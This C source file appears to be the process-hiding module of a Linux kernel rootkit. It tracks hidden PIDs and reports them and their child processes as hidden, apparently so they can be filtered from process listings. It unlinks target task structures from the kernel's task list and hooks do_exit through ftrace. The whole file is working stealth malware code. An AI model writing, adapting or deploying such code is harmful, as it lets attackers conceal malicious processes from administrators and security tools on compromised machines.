#include <linux/list.h>
#include <linux/slab.h>
#include <linux/sched.h>
#include <linux/rwlock.h> //rwlock

#include "helper.h"
#include "process_hiding.h"
#include "ftrace.h"

static int enabled = 0;

//TODO handle task_struct of childs of hidden processes
//TODO lock task list

static DEFINE_RWLOCK(pids_lock);
static LIST_HEAD(hidden_pids);
static LIST_HEAD(hidden_tasks);
static struct list_head *init_task_list = NULL;

struct hidden_task {
    struct list_head list;
    pid_t pid;
};

/*
 * Check if pid is hidden
 *
 * Expects read lock on pids_lock
 */
static struct hidden_task *is_hidden_task(pid_t pid) {

    struct hidden_task *task;

    /*
     * Loop through list and return hidden_task
     */
    list_for_each_entry(task, &hidden_pids, list) {
        if (task->pid == pid) {
            return task;
        }
    }
    return NULL;
}

/*
 * check recursively if pid is successor
 */
int is_child(pid_t pid, struct task_struct *task) {

    struct task_struct *child;

    list_for_each_entry(child, &task->children, sibling) {
        if (pid == child->pid) {
            /* pid is a successor of a hidden process */
            return 1;
        }

        /* go recursive through children of child */
        if (is_child(pid, child)) {
            // pid is a successor of a hidden process
            return 1;
        }

        /* not found yet, continue with other siblings of the current child */
    }

    return 0;
}

/*
 * Check if pid is a child of one of the hidden processes
 *
 * Expects read lock on hidden pids
 *
 * Return 1, if pid is a child, 0 else
 */
int is_hidden_child(pid_t pid) {

    struct task_struct *c_task;
    struct hidden_task *entry;

    list_for_each_entry(entry, &hidden_pids, list) {
        if (NULL != (c_task = pid_task(find_vpid((uintptr_t) entry->pid), PIDTYPE_PID))) {

            /* check for current task c_task (regarding current hidden pid) whether pid is a successor */
            if (is_child(pid, c_task)) {

                /* pid is a successor of a hidden process */
                return 1;
            }
        }

        /* else continue */
    }

    /* not a child */
    return 0;
}

int check_hidden_process(const char *name) {

    long pid;
    int ret = 0;

    if (!enabled)
        return 0;

    read_lock(&pids_lock);

    /*
     * Check if pid is hidden or a child of a hidden one
     */
    if (0 == kstrtol(name, 0, &pid) && ( NULL != is_hidden_task(pid) || is_hidden_child(pid))) {

        /* hide this */
        ret = 1;
    }
    read_unlock(&pids_lock);
    return ret;
}

/*
 * Hide a process if not hidden yet
 */
int hide_process_add(pid_t pid) {

    int ret = 0;
    struct hidden_task *entry;
    struct task_struct *task, *tmp;

    if (!enabled)
        return -1;

    write_lock(&pids_lock);

    /* Check if the process is already hidden */
    if (!is_hidden_task(pid)) {

        /* Create new entry and insert it to hidden pids */
        if (NULL == (entry = kmalloc(sizeof(struct hidden_task), GFP_KERNEL))) {
            ret = -1;
        } else {
            entry->pid = pid;
            list_add_tail(&entry->list, &hidden_pids);

            /*
             * Remove from task_struct list
             *
             * Do not remove init task or kernel task parent, might lead to crashes
             */
            if (pid != 1 && pid != 2) {
                list_for_each_entry_safe(task, tmp, &current->tasks, tasks) {
                    if (task->pid == pid) {
                        /* remove from task_struct list */
                        list_del(&task->tasks);
                        /* store in hidden_tasks */
                        list_add_tail(&task->tasks, &hidden_tasks);
                        goto out;
                    }
                }
            }
        }
    }
out:
    write_unlock(&pids_lock);
    return ret;
}

/*
 * Un-hide a process
 */
int hide_process_rm(pid_t pid) {

    int ret = 0;
    struct hidden_task *entry;
    struct task_struct *task, *tmp;

    if (!enabled)
        return -1;

    write_lock(&pids_lock);

    /* Get entry from hidden pids */
    if (NULL == (entry = is_hidden_task(pid))) {
        ret = -1;
    } else {
        /* remove from list and free struct */
        list_del(&entry->list);
        kfree(entry);

        /* restore from hidden tasks */
        list_for_each_entry_safe(task, tmp, &hidden_tasks, tasks) {
            if (task->pid == pid) {
                /* remove from hidden_tasks list */
                list_del(&task->tasks);
                /* restore in hidden_tasks */
                list_add_tail(&task->tasks, init_task_list);
                goto out;
            }
        }
    }
out:
    write_unlock(&pids_lock);
    return ret;
}

/*
 * Install ftrace hook for do_exit function, which is triggered when
 * processes will be killed or terminate.
 *
 * In this way we can ensure that processes are hidden during its
 * lifetime only.
 */
static void __noreturn (*orig_do_exit)(long code);

/*
 * Hooked do_exit. Unhide process if hidden
 */
static void __noreturn hooked_do_exit(long code) {

    hide_process_rm(current->pid);
    orig_do_exit(code);
}

/*
 * Hook do_exit via ftrace
 */
static struct ftrace_hook exit_hooks[] = {
        {.name = ("do_exit"), .function = (hooked_do_exit), .original = (&orig_do_exit)},
};


int enable_process_hiding(void) {

    struct task_struct *task;

    /*
     * Save init task list head to restore task_structs when unhiding them
     */
    list_for_each_entry(task, &current->tasks, tasks) {
        if (task->pid == 1) {
            init_task_list = &task->tasks;
        }
    }

    /*
     * Install ftrace hooks for do_exit
     */
    if (init_task_list == NULL || 0 > ftrace_install_hooks(exit_hooks, 1)) {
        return -1;
    }

    enabled = 1;
    return 0;
}

/*
 * Disable process hiding
 */
void disable_process_hiding(void) {

    struct hidden_task *entry, *tmp;

    if (!enabled)
        return;

    enabled = 0;

    ftrace_remove_hooks(exit_hooks, 1);

    write_lock(&pids_lock);
    list_for_each_entry_safe(entry, tmp, &hidden_pids, list) {
        list_del(&entry->list);
        kfree(entry);
    }
    write_unlock(&pids_lock);
}